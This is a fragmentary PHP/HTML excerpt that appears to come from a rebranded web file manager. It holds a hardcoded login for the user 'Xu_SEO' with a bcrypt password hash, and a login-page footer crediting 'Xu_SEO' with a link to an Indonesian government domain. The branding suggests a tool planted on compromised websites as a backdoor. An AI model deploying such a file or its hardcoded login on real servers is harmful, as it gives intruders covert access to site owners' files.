...
$use_auth = true;
$auth_users = array(
    'Xu_SEO' => '$2a$12$25QeCmJ3TZBGCa9XzwPPbeuff3FT69/Gp29HUj.xqPM2iu9qxJutu', 
);
                ...
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        <div class="card fat <?php echo fm_get_theme(); ?>">
                            ...
                            &mdash;&mdash; &copy;
                            <a href="https://www.kominfo.go.id" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">🔥Xu_SEO🔥</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
